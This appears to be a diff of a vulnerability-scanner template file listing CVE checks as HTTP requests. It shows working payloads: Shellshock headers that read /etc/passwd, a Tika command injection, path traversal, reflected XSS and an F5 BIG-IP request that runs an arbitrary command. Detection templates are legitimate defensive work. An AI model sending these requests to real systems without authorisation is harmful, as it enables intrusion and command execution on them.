@@ -3311,9 +3311,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -4957,7 +4957,7 @@
     {
       "id": "CVE-2017-12149",
       "info": {
-        "name": "Java/Jboss Deserialization [RCE]",
+        "name": "Jboss Application Server - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -4972,7 +4972,7 @@
     {
       "id": "CVE-2017-12542",
       "info": {
-        "name": "ILO4 Authentication bypass",
+        "name": "HPE Integrated Lights-out 4 (ILO4) <2.53 - Authentication Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -5020,7 +5020,7 @@
     {
       "id": "CVE-2017-12611",
       "info": {
-        "name": "Apache Struts2 S2-053 RCE",
+        "name": "Apache Struts2 S2-053 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -5075,7 +5075,7 @@
     {
       "id": "CVE-2017-12635",
       "info": {
-        "name": "Apache CouchDB 1.7.0 / 2.x < 2.1.1 Remote Privilege Escalation",
+        "name": "Apache CouchDB 1.7.0 / 2.x < 2.1.1 - Remote Privilege Escalation",
         "severity": "critical"
       },
       "requests": [
@@ -5119,7 +5119,7 @@
     {
       "id": "CVE-2017-14135",
       "info": {
-        "name": "Dreambox 2.0.0 RCE",
+        "name": "OpenDreambox 2.0.0 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -5444,7 +5444,7 @@
     {
       "id": "CVE-2017-3881",
       "info": {
-        "name": "Cisco IOS 12.2(55)SE11 Remote Code Execution",
+        "name": "Cisco IOS 12.2(55)SE11 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -5567,7 +5567,7 @@
     {
       "id": "CVE-2017-7269",
       "info": {
-        "name": "Windows Server 2003 & IIS 6.0 RCE",
+        "name": "Windows Server 2003 & IIS 6.0 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -5631,7 +5631,7 @@
     {
       "id": "CVE-2017-8917",
       "info": {
-        "name": "Joomla SQL Injection",
+        "name": "Joomla! <3.7.1 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -5690,7 +5690,7 @@
     {
       "id": "CVE-2017-9791",
       "info": {
-        "name": "Apache Struts2 S2-053 RCE",
+        "name": "Apache Struts2 S2-053 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -6300,11 +6300,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Content-type": "image/jp2",
+            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close"
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -6911,6 +6911,21 @@
           "raw": [
             "GET / HTTP/1.1\nHost: {{Hostname}}\nCookie: lang=en-US; i_like_gogits=../../../../etc/passwd;\n",
             "GET / HTTP/1.1\nHost: {{Hostname}}\nCookie: lang=en-US; i_like_gogits=../../../../etc/dummy;\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-19326",
+      "info": {
+        "name": "Zyxel VMG1312-B10D 5.13AAXA.8 - Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/../../../../../../../../../../../../etc/passwd"
           ]
         }
       ]
@@ -11647,6 +11662,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/backend/admin/common/clearcache?previousUrl=http://www.example.com"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-36510",
+      "info": {
+        "name": "15Zine < 3.3.0 - Reflected Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin-ajax.php?action=cb_s_a&cbi=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -17132,15 +17162,32 @@
       ]
     },
     {
+      "id": "CVE-2022-1221",
+      "info": {
+        "name": "Gwyn's Imagemap Selector <= 0.3.3 - Reflected Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/gwyns-imagemap-selector/popup.php?id=1&class=%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "{{BaseURL}}/wp-content/plugins/gwyns-imagemap-selector/popup.php?id=1%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-1388",
       "info": {
-        "name": "F5 BIG-IP iControl REST Auth Bypass RCE",
+        "name": "F5 BIG-IP iControl - REST Auth Bypass RCE",
         "severity": "critical"
       },
       "requests": [
         {
           "raw": [
-            "POST /mgmt/tm/util/bash HTTP/1.1\nHost: {{Hostname}}\nConnection: keep-alive, X-F5-Auth-Token\nX-F5-Auth-Token: a\nAuthorization: Basic {{base64(auth)}}\nContent-Type: application/json\n\n{\n  \"command\": \"run\",\n  \"utilCmdArgs\": \"-c id\"\n}\n"
+            "POST /mgmt/tm/util/bash HTTP/1.1\nHost: {{Hostname}}\nConnection: keep-alive, X-F5-Auth-Token\nX-F5-Auth-Token: a\nAuthorization: Basic {{base64(auth)}}\nContent-Type: application/json\n\n{\n     \"command\": \"run\",\n     \"utilCmdArgs\": \"-c '{{cmd}}'\"\n}\n",
+            "POST /mgmt/tm/util/bash HTTP/1.1\nHost: localhost\nConnection: keep-alive, X-F5-Auth-Token\nX-F5-Auth-Token: a\nAuthorization: Basic {{base64(auth)}}\nContent-Type: application/json\n\n{\n     \"command\": \"run\",\n     \"utilCmdArgs\": \"-c '{{cmd}}'\"\n}\n"
           ]
         }
       ]
